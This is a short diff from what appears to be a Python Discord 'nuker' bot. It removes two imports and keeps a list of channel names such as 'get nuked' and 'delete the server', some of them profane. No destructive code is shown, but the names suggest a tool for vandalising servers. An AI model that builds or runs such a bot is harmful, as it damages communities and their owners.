@@ -2,8 +2,6 @@ import discord
 from discord.ext import commands
 import random
 from discord import Permissions
-import os
-import asyncio
 
 
 CHANNEL_NAMES = ["get nuked", "delete the server", "get fucked", "trash server"]
